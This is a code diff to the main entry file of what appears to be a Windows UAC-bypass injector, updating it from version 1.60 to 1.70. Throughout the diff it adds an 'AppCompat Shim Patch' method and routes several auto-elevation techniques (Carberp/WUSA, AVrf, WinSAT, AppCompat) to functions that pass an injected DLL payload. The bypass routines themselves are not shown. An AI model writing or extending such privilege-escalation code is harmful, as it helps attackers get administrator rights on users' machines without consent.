@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.60
+*  VERSION:     1.70
 *
-*  DATE:        20 Apr 2015
+*  DATE:        24 Apr 2015
 *
 *  Injector entry point.
 *
@@ -110,8 +110,8 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] Oobe\n\r"));
 			break;
 
-		case METHOD_APPCOMPAT:
-			OutputDebugString(TEXT("[UCM] AppCompat\n\r"));
+		case METHOD_REDIRECTEXE:
+			OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));
 
 #ifdef _WIN64
 			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY,
@@ -149,6 +149,16 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
 			break;
 
+		case METHOD_SHIMPATCH:
+			OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));
+
+#ifdef _WIN64
+			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY,
+				PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+#endif		
+			break;
+
 		}
 	}
 
@@ -170,17 +180,18 @@ VOID main()
 			goto Done;
 		}
 #endif
-		if (ucmStandardAutoElevation(dwType, INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmStandardAutoElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
 		}
 		break;
 
 //
-//  There is no RedirectEXE for x64.
+//  Allow only in 32 version.
 //
 #ifndef _WIN64
-	case METHOD_APPCOMPAT:
-		if (ucmAppcompatElevation()) {
+	case METHOD_REDIRECTEXE:
+	case METHOD_SHIMPATCH:
+		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
 		}
 		break;
@@ -237,7 +248,7 @@ VOID main()
 		}
 
 
-		if (ucmWusaMethod(dwType, INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmWusaMethod(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
 		}
 		break;
@@ -250,7 +261,7 @@ VOID main()
 			goto Done;
 		}
 #endif
-		if (ucmAvrfMethod(AVRFDLL, sizeof(AVRFDLL))) {
+		if (ucmAvrfMethod((CONST PVOID)AVRFDLL, sizeof(AVRFDLL))) {
 			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
 		}	
 		break;
@@ -272,7 +283,7 @@ VOID main()
 			p = L"devobj.dll";
 		}
 
-		if (ucmWinSATMethod(p, INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
 		}
 		break;
